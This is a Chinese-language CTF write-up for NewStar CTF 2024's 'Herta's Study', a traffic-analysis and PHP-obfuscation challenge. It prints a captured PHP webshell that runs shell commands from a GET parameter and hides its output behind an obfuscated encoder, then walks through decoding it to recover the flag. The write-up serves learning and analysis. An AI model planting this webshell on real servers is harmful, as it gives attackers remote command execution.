---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---
<script setup>
import Container from '@/components/docs/Container.vue'
</script>

# Herta's Study

<Container type='tip'>
本题考点：PHP 混淆，流量分析
</Container>

建议配合 unknown 师傅的前两道流量题食用

第七条流量是上传的 PHP 木马

```php
<?php
    $payload=$_GET['payload'];
    $payload=shell_exec($payload);
    $bbb=create_function(
        base64_decode('J'.str_rot13('T').'5z'),
        base64_decode('JG5zPWJhc2U2NF9lbmNvZGUoJG5zKTsNCmZvcigkaT0wOyRpPHN0cmxlbigkbnMpOyRp
        Kz0xKXsNCiAgICBpZigkaSUy'.str_rot13('CG0kXKfAPvNtVPNtVPNtWT5mJlEcKG1m').'dHJfcm90MTMoJG5zWyRpXSk7DQo
        gICAgfQ0KfQ0KcmV0dXJuICRuczs==')
    );
    echo $bbb($payload);
?>
```

可以搜索一下 `create_funtion()` 函数，解除混淆后得到加密代码

```php
$ns = base64_encode($ns);
for ($i = 0; $i < strlen($ns); $i += 1){
    if ($i % 2 == 1) {
        $ns[$i] = str_rot13($ns[$i]);
    }
}
return $ns;
```

就是 Base64 后把奇数位 ROT13

解码反过来就行（第38条，`f.txt` 里的是真 flag，另一个是假 flag）

```php
<?php
$ns = 'ZzxuZ3tmSQNsaGRsUmBsNzVOdKQkZaVZLa0tCt==';
for ($i = 0; $i < strlen($ns); $i += 1){
    if ($i % 2 == 1) {
        $ns[$i] = str_rot13($ns[$i]);
    }
}
echo base64_decode($ns);
// flag{sH3_i4_S0_6eAut1fuL.}
?>
```
